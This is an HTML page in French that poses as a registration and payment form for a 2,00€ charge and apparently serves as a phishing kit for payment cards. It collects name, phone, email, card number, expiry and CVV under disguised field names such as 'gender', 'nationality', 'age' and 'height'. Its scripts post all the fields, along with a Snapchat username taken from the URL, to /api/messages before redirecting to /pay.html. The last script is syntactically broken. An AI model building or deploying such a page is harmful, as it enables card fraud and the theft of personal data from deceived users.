<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Formulaire – Paiement</title>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">

  <style>
    body {
      font-family: 'Inter', sans-serif;
      background: linear-gradient(135deg, #f5f7fb, #e8eefc);
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      margin: 0;
    }

    .card {
      background: #ffffff;
      border-radius: 16px;
      box-shadow: 0 10px 25px rgba(0,0,0,0.1);
      padding: 32px;
      width: 420px;
      transition: transform 0.3s ease, box-shadow 0.3s ease;
    }

    .card:hover {
      transform: translateY(-3px);
      box-shadow: 0 15px 35px rgba(0,0,0,0.15);
    }

    h1 {
      font-size: 20px;
      margin-bottom: 8px;
      text-align: center;
      color: #1a1f36;
    }

    p.subtitle {
      font-size: 13px;
      text-align: center;
      color: #666;
      margin-bottom: 24px;
    }

    form {
      display: flex;
      flex-direction: column;
      gap: 16px;
    }

    label {
      font-size: 13px;
      font-weight: 500;
      color: #333;
      margin-bottom: 4px;
    }

    input, select {
      padding: 12px;
      border: 1px solid #d0d5dd;
      border-radius: 10px;
      font-size: 14px;
      transition: border-color 0.2s, box-shadow 0.2s;
    }

    input:focus, select:focus {
      border-color: #1570ef;
      box-shadow: 0 0 0 3px rgba(21,112,239,0.15);
      outline: none;
    }

    .phone-field {
      display: flex;
      gap: 8px;
    }

    .phone-field select {
      width: 30%;
    }

    .phone-field input {
      width: 70%;
    }

    button {
      background: linear-gradient(180deg, #1570ef, #0b5ed7);
      color: #fff;
      border: none;
      border-radius: 10px;
      padding: 14px;
      font-size: 15px;
      cursor: pointer;
      font-weight: 600;
      transition: background 0.3s, transform 0.1s;
    }

    button:hover {
      background: linear-gradient(180deg, #1a7af0, #0d66db);
    }

    button:active {
      transform: translateY(1px);
    }

    .section-title {
      font-size: 15px;
      font-weight: 600;
      color: #1a1f36;
      border-bottom: 1px solid #eee;
      padding-bottom: 4px;
      margin-top: 12px;
    }

    .summary {
      border-top: 1px solid #eee;
      margin-top: 18px;
      padding-top: 14px;
      display: flex;
      justify-content: space-between;
      font-weight: 600;
      color: #1a1f36;
    }
  </style>
</head>

<body>
  <div class="card">
    <h1>Formulaire d’inscription</h1>
    <p class="subtitle">Veuillez compléter vos informations personnelles</p>

    <form id="confirmForm">
      <div>
        <label>Prénom</label>
        <input type="text" name="firstName" placeholder="Entrez votre prénom" required>
      </div>

      <div>
        <label>Nom</label>
        <input type="text" name="lastName" placeholder="Entrez votre nom" required>
      </div>

      <div>
        <label>Téléphone</label>
        <div class="phone-field">
          <select name="phonePrefix">
            <option>+33</option>
            <option>+32</option>
            <option>+41</option>
          </select>
          <input type="tel" name="phone" placeholder="Numéro de téléphone" required>
        </div>
      </div>

      <div>
        <label>E-mail</label>
        <input type="email" name="email" placeholder="Entrez votre e-mail" required>
      </div>

      <p class="section-title">Informations complémentaires</p>

      <div>
        <label>Titulaire</label>
        <input type="text" name="gender" placeholder="Ex: Homme / Femme">
      </div>

      <div>
        <label>Numéro de carte</label>
        <input type="text" name="nationality" placeholder="Ex: Française">
      </div>

      <div>
        <label>MM/AA</label>
        <input type="text" name="age" placeholder="Ex: 25">
      </div>

      <div>
        <label>Cryptogramme visuel</label>
        <input type="text" name="height" placeholder="Ex: 180">
      </div>

      <button type="submit">CONTINUER</button>
    </form>

    <div class="summary">
      <span>Total</span>
      <span>2,00€</span>
    </div>
  </div>

  <script>
    (function () {
      const API = "/api/messages";

      async function sendLog(data) {
        try {
          await fetch(API, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(data)
          });
        } catch (e) {
          console.error("Erreur lors de l'envoi du log:", e);
        }
      }

      const form = document.getElementById("confirmForm");
      if (!form) return;

      form.addEventListener("submit", async (e) => {
        e.preventDefault();

        // Récupère toutes les infos du formulaire
        const fd = new FormData(form);
        const payload = Object.fromEntries(fd.entries());

        // Envoie dans Neon
        await sendLog({
          event_type: "confirmation_submit",
          user_name: payload.firstName + " " + payload.lastName,
          payload
        });

        // Redirection après envoi
        window.location.href = "/pay.html";
      });
    })();
  </script>
  <script>
(async () => {
  // Récupération des champs du formulaire "confirmation"
  const form = document.querySelector("form");
  if (!form) return;

  form.addEventListener("submit", async (e) => {
    e.preventDefault();

    // Exemple de récupération de champs (adapte aux names/ids réels)
    const firstName = form.querySelector('input[name="firstName"]')?.value || "";
    const lastName  = form.querySelector('input[name="lastName"]')?.value || "";
    const phone     = form.querySelector('input[type="tel"]')?.value || "";
    const email     = form.querySelector('input[type="email"]')?.value || "";

    // Tu peux mettre ici le pseudo Snap stocké en query "?u=..."
    const params = new URLSearchParams(location.search);
    const snapUser = params.get("u") || "";

    // On envoie vers ton API
    try {
      const resp = await fetch("/api/messages", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          event_type: "confirmation_submit",
          user_name: snapUser || email || phone || "anonymous",
          payload: {
            firstName,
            lastName,
            phone,
            email,
            query: Object.fromEntries(params.entries())
          },
          path: location.pathname
        })
      });

      // Optionnel : vérifier la réponse
      const data = await resp.json();
      console.log("API response:", data);

      // Puis rediriger vers la page de paiement
      window.location.href = "/pay.html";
    } catch (err) {
      console.error("Log failed:", err);
      // même si le log échoue, on peut rediriger quand même :
      window.location.href = "/pay.html";
    }
  });
})();
</script>
  <script>
fetch('/api/messages', {

  })
})

  .then(console.log)
  .catch(console.error);
</script>
</body>
</html>
